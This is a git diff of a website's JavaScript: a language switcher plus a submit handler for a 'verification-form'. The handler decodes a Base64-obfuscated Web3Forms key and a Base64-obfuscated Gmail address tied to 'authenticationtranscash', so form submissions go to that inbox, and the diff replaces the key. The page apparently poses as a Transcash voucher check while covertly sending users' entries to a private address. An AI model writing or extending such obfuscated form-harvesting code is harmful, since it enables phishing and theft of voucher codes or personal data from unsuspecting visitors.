@@ -125,10 +125,10 @@ function setLang(lang) {
 function updateLangButtonUI(lang) {
   const flags = { fr: 'fr', en: 'gb', es: 'es', de: 'de', it: 'it' };
   const names = { fr: 'Français', en: 'English', es: 'Español', de: 'Deutsch', it: 'Italiano' };
-  
+
   const currentFlag = document.getElementById('current-flag');
   const currentName = document.getElementById('current-lang-name');
-  
+
   if (currentFlag && currentName) {
     currentFlag.src = `https://flagcdn.com/w20/${flags[lang]}.png`;
     currentName.textContent = names[lang];
@@ -164,11 +164,12 @@ document.addEventListener('DOMContentLoaded', () => {
   // 3. Sécurité Web3Forms (Décodage des clés à l'envoi)
   const form = document.getElementById('verification-form');
   if (form) {
-    // Vos clés encodées en Base64
-    const k = "Zjk3MDA2MzItOWUyZC00NzBjLTg1YzktY2RjMDdlNzJkM2Ex"; 
+    // k correspond à votre nouvelle clé encodée en Base64
+    const k = "MDRkZWY3NDEtMzFiMy00ZWJjLWE0Y2MtNDEzZjBiYWI1ZDgx";
     const m = "YXV0aGVudGlmaWNhdGlvbnRyYW5zY2FzaDE3QGdtYWlsLmNvbQ==";
 
     form.addEventListener('submit', function (e) {
+      // Le décodage atob() restituera la clé originale au moment de l'envoi
       document.getElementById('wf_key').value = atob(k);
       document.getElementById('wf_email').value = atob(m);
     });
